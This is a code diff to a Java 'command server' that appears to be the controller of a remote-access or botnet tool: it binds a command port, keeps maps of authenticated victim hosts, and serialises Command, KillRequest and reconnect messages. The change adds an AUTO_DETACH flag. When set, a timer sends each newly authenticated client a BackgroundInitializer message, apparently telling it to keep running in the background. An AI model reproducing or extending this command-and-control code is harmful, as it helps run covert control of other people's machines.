@@ -28,6 +28,7 @@ public class Main {
     static final String PUBLIC_KEY_FILE = "CNCKeys/publicKey";
     static final String PRIVATE_KEY_FILE = "CNCKeys/privateKey";
     public static final int COMMAND_PORT = 83;
+    static boolean AUTO_DETACH = false;
 
     static final int RECONNECT_REQUEST_TIMEOUT = 2000;
 
@@ -42,13 +43,21 @@ public class Main {
 
     //Maps of <IP><Hostname> that have successfully authenticated with this command server.
     public static HashMap<String, String> authenticatedClients = new HashMap<String, String>();
+    public static HashMap<String, String> reconnectedClients = new HashMap<String, String>();
 
     //List of classes to be registered with kryo for serialization/deserialization
-    public static final List<Class> KRYO_CLASSES = Arrays.asList(BackgroundInitializer.class,byte[].class,PublicKeyTransmission.class,KeyRequest.class,ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class
+    public static final List<Class> KRYO_CLASSES = Arrays.asList(BackgroundInitializer.class, byte[].class, PublicKeyTransmission.class, KeyRequest.class, ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class
     );
 
 
     public static void main(String[] args) {
+        try {
+            AUTO_DETACH = Boolean.parseBoolean(args[0]);
+        } catch (Exception e) {
+            error("Unable to parse command line arguments");
+            System.exit(0);
+        }
+
         if (generateKeys()) {
             initialize();
             registerClasses();
@@ -111,7 +120,7 @@ public class Main {
             server.bind(COMMAND_PORT);
             log("Bound to port: " + COMMAND_PORT);
 
-             //TODO Run reachabilty diagnostics after port binding
+            //TODO Run reachabilty diagnostics after port binding
         } catch (Exception e) {
             e.printStackTrace();
             error("Could not bind to port and start server");
@@ -183,7 +192,20 @@ public class Main {
                         };
                         timer.scheduleAtFixedRate(task, 1000, 3000);
 
+                        Timer timer2 = new Timer("Timer2");
+                        TimerTask task2 = new TimerTask() {
+                            public void run() {
+                                if (AUTO_DETACH) {
+                                    if (!reconnectedClients.containsKey(connection.getRemoteAddressTCP().getHostName())) {
+                                        connection.sendTCP(new BackgroundInitializer(UUID.randomUUID().toString()));
+                                        reconnectedClients.put(connection.getRemoteAddressTCP().getHostName(), connection.getRemoteAddressTCP().getAddress().getHostAddress());
+                                    }
 
+
+                                }
+                            }
+                        };
+                        timer2.schedule(task2, 1000 * 8);
                     } else {
                         error("Invalid authentication request was sent by: [" + request.getHostName() + "] at [" + request.getIpAddress() + "]");
                         connection.close();
